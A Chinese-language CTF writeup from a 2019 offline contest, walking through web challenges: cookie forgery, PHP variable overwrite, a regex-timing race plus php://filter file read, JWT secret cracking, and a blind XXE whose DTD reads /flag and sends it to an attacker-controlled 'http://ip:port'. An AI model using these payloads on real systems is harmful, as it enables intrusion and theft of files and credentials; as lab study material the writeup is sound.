---
title: 川师线下CTF Writeup
date: May 15th 2019
tags: [CTF, Writeup, Web安全, SQL注入]
summary: 川师线下 CTF 赛后复盘，涵盖 418 错误页面 Cookie 伪造、SQL 注入绕过等多道 Web 题目的解题思路与学习总结。
---

# 川师线下CTF Writeup

## 说在前面

这次和队友一起去川师打了一次线下的CTF。虽然比赛中很多题都没做出来，但学到很多东西。赛后出题师傅也给出了源码和Writeup，抓住机会总结学习。

重新搭建题目的环境有点困难，所以还是有两题无法进行复现。 

## Web

### 418

打开网页后是一个418的错误页面。

![pic](https://i.loli.net/2019/05/17/5cde2430300e851524.jpg)

Google了一下418错误

```
“ERR！418 我是茶壶”起源
“错误 418 我是茶壶”消息不是标准的服务器错误类型，这是 1998 年的一个愚人节恶作剧，距今已有 20 年了。许多开发团队在他们的应用程序中实施了“错误 418 我是茶壶”的消息作为内部笑话，通常使用这个错误来处理未知来源的错误。
```

又在cookie处发现了一个base64加密的值： 解密后为：coffee

![pic](https://i.loli.net/2019/05/17/5cde24303bb8224199.jpg)

用Brupsuite抓包后修改了cookie的值，网页提示：

```
Tell me what you want ! 
```

于是我修改为flag的加密值，没用。在修改很多次之后队友解出来了。竟然是tea的base64。

修改cookie后访问得到flag，这题，真的有点考脑洞。

![pic](https://i.loli.net/2019/05/17/5cde24303009952057.jpg)

### 签到题

是一道简单的代码审计题。

```php
<?php
require('config.php');

$user = null;
if(!empty($_GET['data'])) {
    try {
        $data = json_decode($_GET['data'], true);
    } catch (Exception $e) {
        $data = [];
    }
    extract($data);
    if($users[$username]) {		
        $user = $username;
    }

}
if ($user==$usname) {
    echo "sicnuctf{************}";
}
?>
```

参数data在经过json_decode之后进行了变量覆盖。

构造payload：

data = {“usname”:”123”, “users”:{“username”:”123”}, “user”:”123”}

得到Flag

![pic](https://i.loli.net/2019/05/17/5cde2465d8f5995939.jpg)

### PHP是世界上最好的语言

用御剑，可以直接跑出登录，注册的源码地址，注册一个账号，登录进去可以拿到member.php的源码。

register.php

```php
<?php
include('config.php');
try{
$pdo = new PDO('mysql:host=localhost;dbname=***', '***', '***');
}catch (Exception $e){
die('mysql connected error');
}					//str_shuffle()随机地打乱字符串中的所有字符
$admin = "sicnu"."#".str_shuffle('hello_here_is_your_flag_but_it_no_easy');
$username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
$password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');
$code = (isset($_POST['code']) === true) ? (string)$_POST['code'] : '';

if (strlen($username) > 16 || strlen($username) > 16) {
die('is too long');
}

$sth = $pdo->prepare('SELECT username FROM users WHERE username = :username');
$sth->execute([':username' => $username]);
if ($sth->fetch() !== false) {
die('username has been registered');
}

$sth = $pdo->prepare('INSERT INTO users (username, password) VALUES (:username, :password)');
$sth->execute([':username' => $username, ':password' => $password]);

preg_match('/^(sicnu)((?:#|\w)+)$/i', $code, $matches);
if (count($matches) === 3 && $admin === $matches[0]) {
$sth = $pdo->prepare('INSERT INTO inspect (username, permit) VALUES (:username, :permit)');
$sth->execute([':username' => $username, ':permit' => $matches[1]]);
} else {
$sth = $pdo->prepare('INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")');
$sth->execute([':username' => $username]);
}
echo '<script>alert("register success");location.href="log.html"</script>'; 
?>
```

Log.php

```php
<?php
session_start();
include('config.php');
try{
$pdo = new PDO('mysql:host=localhost;dbname=***', '***', '***');
}catch (Exception $e){
die('mysql connected error');
}
$username = (isset($_POST['username']) === true && $_POST['username'] !== '') ? (string)$_POST['username'] : die('Missing username');
$password = (isset($_POST['password']) === true && $_POST['password'] !== '') ? (string)$_POST['password'] : die('Missing password');

if (strlen($username) > 32 || strlen($password) > 32) {
die('is too long');
}

$sth = $pdo->prepare('SELECT password FROM users WHERE username = :username');
$sth->execute([':username' => $username]);
if ($sth->fetch()[0] !== $password) {
die('Error in username or password');
}
$_SESSION['username'] = $username;
unset($_SESSION['is_logined']);
unset($_SESSION['is_guest']);
#echo $username;
header("Location: member.php"); 
?>
```

Member.php

```php
<?php
error_reporting(0);
session_start();
include('config.php');
if (isset($_SESSION['username']) === false) {
die('please login first');
}
try{
$pdo = new PDO('mysql:host=localhost;dbname=***', '***', '***');
}catch (Exception $e){
die('mysql connected error');
}
$sth = $pdo->prepare('SELECT permit FROM inspect WHERE username = :username');
$sth->execute([':username' => $_SESSION['username']]);
if ($sth->fetch()[0] === 'TERRIBLE') {
$_SESSION['is_guest'] = true;
}

$_SESSION['is_logined'] = true;
if (isset($_SESSION['is_logined']) === false || isset($_SESSION['is_guest']) === true) {
	echo "no no no!";
}else{
if(isset($_GET['file'])===false)
echo "no";
elseif(is_file($_GET['file']))
echo "you cannot give me a file";
else
readfile($_GET['file']);
}
?>
```

拿到Flag的关键在于要绕过一个is_guest判断。

member.php源码处：

```php
<?php
$sth = $pdo->prepare('SELECT permit FROM inspect WHERE username = :username');
$sth->execute([':username' => $_SESSION['username']]);
if ($sth->fetch()[0] === 'TERRIBLE') {
$_SESSION['is_guest'] = true;
}
?>
```

而TERRIBLE是在注册时写入的，在register.php源码中：

```php
<?php
preg_match('/^(sicnu)((?:#|\w)+)$/i', $code, $matches);
if (count($matches) === 3 && $admin === $matches[0]) {
$sth = $pdo->prepare('INSERT INTO inspect (username, permit) VALUES (:username, :permit)');
$sth->execute([':username' => $username, ':permit' => $matches[1]]);
} else {
$sth = $pdo->prepare('INSERT INTO inspect (username, permit) VALUES (:username, "TERRIBLE")');
$sth->execute([':username' => $username]);
}
?>
```

先进行了一个正则匹配，再进行了if语句，其中一个条件为`$admin === $matches[0]`

根据前面的`$admin = "sicnu"."#".str_shuffle('hello_here_is_your_flag_but_it_no_easy');` 可知,admin的值为一个随机值，这里只能进行绕过。

这里可以利用条件竞争绕过

正则表达式的意义如图所示

![web4_zhengze.jpg](https://i.loli.net/2019/05/17/5cde24a10415b69935.jpg)

如果在#号后面赋值非常长的一段字符，在php匹配的时长会消耗资源（拖延时间）导  
致后面的语句暂时无法执行。也就无法将permit字段设置为TERRIBLE。

因为前面已经注册了账号，所以这里就可以绕过is_guest的判断。

正常注册登录提示：no no no!

![web4_nonono.jpg](https://i.loli.net/2019/05/17/5cde24a10052a43128.jpg)

重新注册一个账号，code处赋值为长字符串：

![web4_reg.jpg](https://i.loli.net/2019/05/17/5cde24a11e9be38274.jpg)

重新登录,显示no，说明已经绕过is_guest

![web4_no.jpg](https://i.loli.net/2019/05/17/5cde24a0ec43273869.jpg)

最后还需要用PHP伪协议绕过is_file函数

```
payload：
member.php?file=php://filter/read/convert.base64-encode/resource=config.php
```

读config.php得到flag的base64，解码即可。

### 龙湖论坛

比赛的时候还没有接触过JWT，也没有时间做了，这里就相当于复现了。

一个论坛，只有简单的注册，登录和一个留言功能。

RSS订阅需要先成为VIP。

![pic](!%5Bweb5_tpvip.jpg%5D(https://i.loli.net/2019/05/17/5cde24dd697f768705.jpg))

登录之后，可以在cookie值里面看到token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzeXMiLCJ1c2VybmFtZSI6ImFkbWluIiwiaXN2aXAiOjAsImlhdCI6MTU1NzkyODE2NSwiZXhwIjoxNTU3OTMxNzY1LCJuYmYiOjE1NTc5MjgxNjUsImp0aSI6IjBlMjM5MTI4OWZmMmNmZTc0NjUxZjIyMDlkYzk5YmI1In0.WKRwWB3QE6CG3BYi3WGQ9EBIX3g_YCT26bJsaDMGsXo
```

解密后的格式为：

```
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "siss": "sys",
  "username": "admin",
  "isvip": 0,
  "iat": 1557928165,
  "exp": 1557931765,
  "nbf": 1557928165,
  "jti": "0e2391289ff2cfe74651f2209dc99bb5"
}
```

我们需要得到密钥，来修改isvip的值为1。

这里可以使用工具：[https://github.com/Sjord/jwtcrack](https://github.com/Sjord/jwtcrack) 来爆破密钥。

构造密钥后爆破得到密钥为sicnuctf

![web5_rss.jpg](https://i.loli.net/2019/05/17/5cde24dd77fb099016.jpg)

使用在线工具[https://jwt.io/](https://jwt.io/) 修改JWT的值，然后修改cookie的token即可进入rss订阅页面。

![web5_findkey.jpg](https://i.loli.net/2019/05/17/5cde24dd7c86615595.jpg)

看Writeup知道，这里是一个Blind XXE。

由于环境配置，这里复现不了这个XXE，直接贴师傅的脚本了：

payload.xml

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://ip/evil.dtd">
<root>&p;</root>
```

evil.dtd

```plain
<!ENTITY % p1 SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % p2 "<!ENTITY p SYSTEM 'http://ip:port/%p1;'>">
%p2;
```

## 后话

接触到了两个新东西：

1. php的条件竞争
2. JWT

后期还要更多的总结一下。